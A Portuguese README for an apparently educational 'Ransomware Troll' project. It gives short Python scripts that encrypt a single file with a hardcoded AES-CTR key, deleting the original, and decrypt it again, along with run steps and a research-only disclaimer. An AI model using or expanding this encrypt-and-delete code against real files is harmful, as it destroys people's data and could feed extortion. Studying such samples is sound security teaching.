# Documentação do Ransomware Troll

Esta documentação fornece informações sobre o Ransomware Troll, um programa de criptografia de arquivos malicioso, e mostra como descriptografar arquivos que foram afetados por ele. Este documento inclui uma descrição detalhada dos códigos base necessários para descriptografar e criptografar arquivos afetados pelo Ransomware Troll.

## Descrição

O Ransomware Troll é um tipo de malware que criptografa arquivos presentes em um sistema e exige um resgate para fornecer a chave de descriptografia. Os códigos apresentados aqui são soluções para descriptografar arquivos afetados pelo Ransomware Troll e também para criptografar arquivos usando o mesmo método de criptografia.

## Pré-requisitos

Antes de executar os códigos de descriptografia e criptografia, é necessário ter o Python instalado em seu sistema. Além disso, você deve ter a biblioteca `pyaes` instalada. Você pode instalá-la usando o comando `pip install pyaes`.

## Código de Descriptografia

Aqui está o código base que pode ser usado para descriptografar arquivos criptografados pelo Ransomware Troll:

```python
import os
import pyaes

# Nome do arquivo criptografado
file_name = "arquivo.txt.ransomwaretroll"

# Abrir o arquivo criptografado em modo de leitura binária
file = open(file_name, "rb")
file_data = file.read()
file.close()

# Chave para descriptografia
key = b"testeransomwares"
aes = pyaes.AESModeOfOperationCTR(key)

# Realizar a descriptografia
decrypt_data = aes.decrypt(file_data)

# Remover o arquivo criptografado
os.remove(file_name)

# Criar o arquivo descriptografado
new_file = "arquivo.txt"
new_file = open(f'{new_file}', "wb")
new_file.write(decrypt_data)
new_file.close()
```

Certifique-se de substituir `"arquivo.txt.ransomwaretroll"` pelo nome do arquivo criptografado real que você deseja descriptografar e `"testeransomwares"` pela chave correta de descriptografia fornecida pelo atacante.

## Código de Criptografia

Aqui está o código base que pode ser usado para criptografar arquivos usando o Ransomware Troll:

```python
import os
import pyaes

# Nome do arquivo a ser criptografado
file_name = "arquivo.txt"

# Abrir o arquivo em modo de leitura binária
file = open(file_name, "rb")
file_data = file.read()
file.close()

# Remover o arquivo original
os.remove(file_name)

# Chave para criptografia
key = b"testeransomwares"
aes = pyaes.AESModeOfOperationCTR(key)

# Realizar a criptografia
crypto_data = aes.encrypt(file_data)

# Nome do novo arquivo criptografado
new_file = file_name + ".ransomwaretroll"
new_file = open(f'{new_file}', 'wb')
new_file.write(crypto_data)
new_file.close()
```

Certifique-se de substituir `"arquivo.txt"` pelo nome do arquivo que você deseja criptografar e `"testeransomwares"` pela chave correta de criptografia. O código criptografará o arquivo selecionado e salvará uma versão criptografada com a extensão `.ransom

waretroll`.

## Instruções

Para descriptografar um arquivo afetado pelo Ransomware Troll, siga estas etapas:

1. Verifique se você tem o Python instalado em seu sistema.

2. Instale a biblioteca `pyaes` usando o comando `pip install pyaes`.

3. Copie o código de descriptografia fornecido acima e cole-o em um novo arquivo Python.

4. Abra o arquivo Python em um editor de texto e modifique a linha `file_name = "arquivo.txt.ransomwaretroll"` para corresponder ao nome do arquivo criptografado que você deseja descriptografar.

5. Verifique se a chave correta de descriptografia está definida na linha `key = b"testeransomwares"`. Se o atacante tiver fornecido uma chave diferente, atualize-a aqui.

6. Salve o arquivo Python com um nome adequado, por exemplo, `descriptografar.py`.

7. Abra o terminal ou prompt de comando e navegue até o diretório onde você salvou o arquivo Python.

8. Execute o arquivo Python digitando o seguinte comando: `python descriptografar.py`.

9. O código descriptografará o arquivo e removerá o arquivo criptografado original.

10. Verifique se o arquivo descriptografado foi criado corretamente.

Para criptografar um arquivo usando o Ransomware Troll, siga as mesmas etapas de 1 a 7 acima, mas substitua o código de descriptografia pelo código de criptografia fornecido. Certifique-se de fornecer o nome do arquivo que você deseja criptografar e a chave correta de criptografia. O arquivo criptografado será salvo com a extensão `.ransomwaretroll`.

**Nota:** É importante ressaltar que esta solução foi fornecida apenas para fins educacionais e de pesquisa, e não é incentivado o uso de ransomware ou atividades ilegais. A descriptografia de arquivos criptografados por ransomware só é possível se você tiver acesso à chave correta de descriptografia. Recomenda-se que você procure assistência de profissionais de segurança cibernética ao lidar com ataques de ransomware.
